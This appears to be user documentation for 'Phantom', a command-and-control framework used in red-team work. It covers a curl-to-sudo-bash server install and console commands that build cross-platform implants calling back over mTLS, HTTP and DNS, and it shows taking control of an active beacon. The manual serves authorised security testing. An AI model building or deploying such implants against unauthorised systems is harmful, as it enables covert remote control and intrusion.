Download the latest server [release](https://github.com/cryptdefender3232/phantom/releases) for your platform, and just run the binary. That's it, you're pretty much done.

Phantom is designed for a one server deployment per operation. The server supports Linux, Windows, and MacOS however we strongly recommend running the server on a Linux host (or MacOS, well really anything that isn't Windows), as some features may be more difficult to get working on a Windows server. The Windows client should work just fine when accessing a Linux/MacOS server from Windows, so if for some odd reason your operators actually want to use Windows you can still accommodate them using [multiplayer mode](/docs?name=Multi-player+Mode).

Obfuscated builds require `git` to be installed. Additionally, Phantom has an external dependencies for _optional_ features: Metasploit. To enable some MSF integrations you'll need Metasploit installed on the server.

For a Linux server, you can also use the one-liner installation `curl https://phantom.sh/install|sudo bash`

```asciinema
{"src": "/asciinema/install-1.cast", "cols": "132"}
```

If you install Phantom via the one-liner, you can check that the server service is running using `systemctl status phantom`. Note that the Phantom service is not configured to start automatically on boot by default (i.e., if you reboot the server you'll need to start the service again using `systemctl start phantom`):
...
```asciinema
{"src": "/asciinema/phantom-generate-1.cast", "cols": "132"}
```

#### Beacon Mode

```asciinema
{"src": "/asciinema/phantom-generate-2.cast", "cols": "132"}
```

Phantom implants are cross-platform, you can change the compiler target with the `--os` flag. Phantom accepts any Go GOOS and GOARCH as arguments `--os` and `--arch`, we officially only support Windows, MacOS, and Linux, but you can at least attempt to compile for any other [valid Go GOOS/GOARCH](https://gist.github.com/asukakenji/f15ba7e588ac42795f421b48b8aede63) combination. The `generate info` command will also estimate what compiler targets can be used based on the server's host operating system and available cross-compilers.

Some commands/features may not work on "unsupported" platforms.

```
phantom > generate --mtls example.com --save /Users/moloch/Desktop --os mac

[*] Generating new darwin/amd64 Phantom binary
[*] Build completed in 00:00:09
[*] Phantom binary saved to: /Users/moloch/Desktop/PROPER_ANTHONY
```
...
```
phantom > regenerate --save /Users/moloch/Desktop NEW_GRAPE

[*] Phantom binary saved to: /Users/moloch/Desktop/NEW_GRAPE.exe
```
...
[server] phantom > use 8c465643-0e65-45f2-bb7e-acb3480de3cb

[*] Active beacon RELATIVE_ADVERTISEMENT (8c465643-0e65-45f2-bb7e-acb3480de3cb)

[server] phantom (RELATIVE_ADVERTISEMENT) >
```
...
```
[server] phantom (RELATIVE_ADVERTISEMENT) > ls
...
```
[server] phantom (RELATIVE_ADVERTISEMENT) > tasks
...
```
[server] phantom (RELATIVE_ADVERTISEMENT) > interactive
...
By default Phantom will attempt to use the `s` sequential connection strategy: the most performant protocols are used first (MTLS -> WG -> HTTP(S) -> DNS) falling back to subsequent domains/protocols if/when connections fail.

```
phantom > generate --mtls example.com --http foobar.com --dns 1.lil-peep.rip
```
...
```
phantom > generate --mtls foo.com,bar.com,baz.com --strategy r
```
